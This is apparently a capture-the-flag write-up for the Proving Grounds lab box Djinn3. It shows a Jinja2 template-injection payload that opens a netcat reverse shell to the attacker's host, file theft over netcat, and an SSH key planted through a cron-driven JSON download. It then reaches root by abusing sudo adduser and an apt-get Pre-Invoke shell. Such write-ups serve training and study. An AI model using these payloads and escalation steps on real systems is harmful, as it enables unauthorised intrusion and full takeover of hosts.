---
layout: default
title: Djinn3
parent: Proving Grounds Play
nav_order: 31
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.158.102
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-17 18:47 EST
Nmap scan report for 192.168.158.102
Host is up (0.072s latency).
Not shown: 63726 closed tcp ports (reset), 1805 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
80/tcp    open  http    lighttpd 1.4.45
|_http-title: Custom-ers
|_http-server-header: lighttpd/1.4.45
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
31337/tcp open  Elite?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL:
|     username>
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     username> password> authentication failed
|   Help:
|     username> password>
|   RPCCheck:
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq:
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie:
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
1 service unrecognized despite returning data. If you know the service/version, please submit the follow
ing fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

# Enumeration

---

## Users:

- jack
- admin
- guest
- jason
- david
- freddy

## 5000 | HTTP

Enumerating the different pages for "tickets" we enumerate users and it appears there is a default _guest_ user.

![guest](../../../assets/images/ctfs/proving_grounds/djinn3/guest.png)

## 31337 | HTTP

The web page just says _authentication failed_ and Gobuster has similar message and fails when attempting to scan.

![auth](../../../assets/images/ctfs/proving_grounds/djinn3/auth.png)

Attempt to use Netcat to authenticate on port 31337 with the default creds \*guest:guest"

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ nc -nv 192.168.158.102 31337
(UNKNOWN) [192.168.158.102] 31337 (?) open
username> guest
password> guest

Welcome to our own ticketing system. This application is still under
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit

>
```

We have the ability to open tickets

![test](../../../assets/images/ctfs/proving_grounds/djinn3/test.png)

Since this is a Flask Python server it is likely using Jinja to render the HTML.

Let's test for Jinja SSTI (Server Side Template Injection)

![test2](../../../assets/images/ctfs/proving_grounds/djinn3/test2.png)

![seven](../../../assets/images/ctfs/proving_grounds/djinn3/seven.png)

Next let's test if we get Jinja specific SSTI by trying to display the _id_ command

![test3](../../../assets/images/ctfs/proving_grounds/djinn3/test3.png)

![ssti](../../../assets/images/ctfs/proving_grounds/djinn3/ssti.png)

Our SSTI test worked so we can proceed with attempting to exploit.

# Exploitation

---

## Jinja2 SSTI

Use Revshellgen to generate a _nc-mknod_ reverseh shell one-liner

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

```

{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l').read()}}

Send the payload to the target using the open ticket Jinja2 SSTI exploit

![test4](../../../assets/images/ctfs/proving_grounds/djinn3/test4.png)

Click the link of the created ticket and we get a reverse shell.

![link2](../../../assets/images/ctfs/proving_grounds/djinn3/link2.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.158.102] 45698
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Upload pspy64

Let's observe anything that runs like Cron jobs

```bash
# Upload to target machine
www-data@djinn3:/tmp$ wget http://192.168.45.217:8000/pspy64
wget http://192.168.45.217:8000/pspy64
--2023-11-18 08:56:43--  http://192.168.45.217:8000/pspy64
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  3.59MB/s    in 0.8s

2023-11-18 08:56:44 (3.59 MB/s) - ‘pspy64’ saved [3104768/3104768]

www-data@djinn3:/tmp$ chmod +x pspy64

# Target uploads from Python simple http server running on target
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.158.102 - - [17/Nov/2023 22:26:03] "GET /pspy64 HTTP/1.1" 200 -


www-data@djinn3:/tmp$ ./pspy64
./pspy64

2023/11/18 09:00:36 CMD: UID=0     PID=2      |
2023/11/18 09:00:36 CMD: UID=0     PID=1      | /sbin/init
2023/11/18 09:03:01 CMD: UID=1000  PID=1881   | /usr/bin/python3 /home/saint/.sync-data/syncer.py
2023/11/18 09:03:01 CMD: UID=1000  PID=1880   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py
2023/11/18 09:03:01 CMD: UID=0     PID=1879   | /usr/sbin/CRON -f
2023/11/18 09:06:01 CMD: UID=1000  PID=1889   | /usr/bin/python3 /home/saint/.sync-data/syncer.py
2023/11/18 09:06:01 CMD: UID=1000  PID=1888   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py
2023/11/18 09:06:01 CMD: UID=0     PID=1887   | /usr/sbin/CRON -f

```

There are Cron jobs running that trigger _syncer.py_ from the _/home/saint/.sync-data_ directory.

We don't have access to these files but we can locate the source _.pyc_ files.

## Python Files in /opt Directory

```bash
www-data@djinn3:/opt$ ls -la
ls -la
total 24
drwxr-xr-x  4 root     root     4096 Jun  4  2020 .
drwxr-xr-x 23 root     root     4096 Sep 30  2020 ..
-rwxr-xr-x  1 saint    saint    1403 Jun  4  2020 .configuration.cpython-38.pyc
-rwxr-xr-x  1 saint    saint     661 Jun  4  2020 .syncer.cpython-38.pyc
drwxr-xr-x  2 www-data www-data 4096 May 17  2020 .tick-serv
drwxr-xr-x  4 www-data www-data 4096 Jun  4  2020 .web

```

Let's download these to our attack machine so we can decompile the compiled Python files.

```bash
# Target box send the file through netcat
www-data@djinn3:/opt$ nc 192.168.45.217 1 < .syncer.cpython-38.pyc
nc 192.168.45.217 1 < .syncer.cpython-38.pyc

# Attack box receive the file through netcat
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ nc -nlvp 1 > syncer.pyc
listening on [any] 1 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.158.102] 35916

# Send the second file from the target box
www-data@djinn3:/opt$ nc 192.168.45.217 1 < .configuration.cpython-38.pyc
nc 192.168.45.217 1 < .configuration.cpython-38.pyc

# Receive the second file on the attack box
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ nc -nlvp 1 > configuration.pyc
listening on [any] 1 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.158.102] 35924

```

## Decompile Python C Files

We can use _pycdc_ to decompile the compiled Python files

[Github for Pycdc](https://github.com/zrax/pycdc)

Install _pycdc_

```bash
┌──(vagrant㉿kali)-[/opt]
└─$ sudo git clone https://github.com/zrax/pycdc.git
Cloning into 'pycdc'...
remote: Enumerating objects: 2609, done.
remote: Counting objects: 100% (1063/1063), done.
remote: Compressing objects: 100% (283/283), done.
remote: Total 2609 (delta 849), reused 801 (delta 777), pack-reused 1546
Receiving objects: 100% (2609/2609), 724.76 KiB | 3.68 MiB/s, done.
Resolving deltas: 100% (1637/1637), done.


┌──(vagrant㉿kali)-[/opt/pycdc]
└─$ sudo cmake .
-- The C compiler identification is GNU 12.2.0
-- The CXX compiler identification is GNU 12.2.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Found Python: /usr/bin/python3 (found version "3.11.4") found components: Interpreter
-- Configuring done (1.7s)
-- Generating done (0.0s)
-- Build files have been written to: /opt/pycdc

──(vagrant㉿kali)-[/opt/pycdc]
└─$ sudo make
[  2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp, bytes/python_39.cpp, bytes/python_310.cpp, bytes/python_311.cpp, bytes/python_312.cpp
[  4%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o
[  6%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o
[  9%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o
[ 11%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cp

┌──(vagrant㉿kali)-[/opt/pycdc]
└─$ sudo make check
[ 90%] Built target pycxx
[100%] Built target pycdc
*** async_def: PASS (1)
*** async_for: PASS (1)
*** binary_ops: PASS (1)
*** build_const_key_map: PASS (2

```

Run _pycdc_ against the compiled Python files

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ sudo /opt/pycdc/pycdc configuration.pyc
# Source Generated with Decompyle++
# File: configuration.pyc (Python 3.8)

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ sudo /opt/pycdc/pycdc syncer.pyc
# Source Generated with Decompyle++
# File: syncer.pyc (Python 3.8)


```

Review _configuration.py_

It's looking for a file in _/tmp_ that has the file name _config_ with the date stamp included.

![configuration](../../../assets/images/ctfs/proving_grounds/djinn3/configuration.png)

Looking at _syncer.py_, it is looking for the JSON file and if _URL_ is the value it reads in the _Output_ value.

![syncer](../../../assets/images/ctfs/proving_grounds/djinn3/syncer.png)

## Get SSH Connection as Saint

First, generate an SSH key pair.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3/.ssh]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vagrant/.ssh/id_rsa):
/home/vagrant/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/vagrant/.ssh/id_rsa
Your public key has been saved in /home/vagrant/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:2nmBnh6qsa9HOOtuI9FQxwA5L+V1STY+g5Nt+kD+qms vagrant@kali
The key's randomart image is:
+---[RSA 3072]----+
|  .o.o .+.       |
|  o o +*o.       |
|   * o=.*        |
|  o oo + +       |
|   + .+ S .      |
|  . + .B o .     |
|   ..+. O .      |
|  . Eo.+ o       |
|   *OO+ .        |
+----[SHA256]-----+




```

Copy _id_rsa.pub_ to current directory .ssh as _authorized_keys_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3/.ssh]
└─$ cp /home/vagrant/.ssh/id_rsa.pub authorized_keys
```

Get the _date_ value

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ date
Fri Nov 17 11:06:22 PM EST 2023

```

Create malicious JSON file.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ vim 17-11-2023.config.json

# The JSON file needs to have the "URL" and "Output" values to match what the Python file is looking for.
{
"URL" : "http://192.168.45.217:8000/authorized_keys",
"Output" : "/home/saint/.ssh/authorized_keys"
}
```

Transfer the payload to the target.

```bash
www-data@djinn3:/tmp$ wget http://192.168.45.217:8000/17-11-2023.config.json
wget http://192.168.45.217:8000/17-11-2023.config.json
--2023-11-18 09:45:01--  http://192.168.45.217:8000/17-11-2023.config.json
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 104 [application/json]
Saving to: ‘17-11-2023.config.json’

17-11-2023.config.j 100%[===================>]     104  --.-KB/s    in 0s

2023-11-18 09:45:02 (19.3 MB/s) - ‘17-11-2023.config.json’ saved [104/104]

```

Now run the Python simple server in the same directory that _authorized_keys_ is located and the cron job download to the target.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3/.ssh]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.158.102 - - [17/Nov/2023 23:17:23] "GET /authorized_keys HTTP/1.1" 200 -



```

Now we can SSH to the target as Saint.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3/.ssh]
└─$ ssh saint@192.168.158.102
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 18 10:03:08 IST 2023

  System load:  0.0               Processes:           156
  Usage of /:   35.7% of 9.78GB   Users logged in:     0
  Memory usage: 18%               IP address for eth0: 192.168.158.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

134 packages can be updated.
93 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

saint@djinn3:~$ id
uid=1000(saint) gid=1002(saint) groups=1002(saint)
```

## Check Sudo Permissions for Saint

```bash
saint@djinn3:~$ sudo -l
Matching Defaults entries for saint on djinn3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

```

## Add User with Sudo Permissions

```bash
saint@djinn3:~$ sudo /usr/sbin/adduser kamino --uid 0
adduser: The UID 0 is already in use.

```

The UID of 0 is already in use.

Instead add user with --gid 0

```bash
saint@djinn3:~$ sudo /usr/sbin/adduser kamino --gid 0
Adding user `kamino' ...
Adding new user `kamino' (1003) with group `root' ...
Creating home directory `/home/kamino' ...
Copying files from `/etc/skel' ...
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for kamino
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n]

kamino@djinn3:/home/saint$ id
uid=1003(kamino) gid=0(root) groups=0(root)


```

We are getting close, but we still are not root because we don't have the effective UID of 0.

Let's see if we can access the Sudoers file.

```bash
kamino@djinn3:/home/saint$ cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:
# If you need a huge list of used numbers please install the nmap package.

saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

jason ALL=(root) PASSWD: /usr/bin/apt-get
#includedir /etc/sudoers.d

```

At the very bottom we can see the user _jason_ that has root access to the command _/usr/bin/apt-get_

Since this user is not currently in _/etc/passwd_ they must been a hidden user.

If we can _su_ to _jason_ then we can pivot to root.

Switch back to _saint_ and add _jason_ back with GID 0

```bash
kamino@djinn3:/home/saint$ exit
exit
saint@djinn3:~$ sudo /usr/sbin/adduser jason --gid 0
Adding user `jason' ...
Adding new user `jason' (1004) with group `root' ...
Creating home directory `/home/jason' ...
Copying files from `/etc/skel' ...
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for jason
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n]
```

## Sudo Permissions of Jason

```bash
jason@djinn3:/home/saint$ sudo -l
[sudo] password for jason:
Matching Defaults entries for jason on djinn3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on djinn3:
    (root) PASSWD: /usr/bin/apt-get

```

Checking GFTOBins we have a way to exploit _apt-get_ with Sudo permissions

![gtfo](../../../assets/images/ctfs/proving_grounds/djinn3/gtfo.png)

```bash
jason@djinn3:/home/saint$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

```
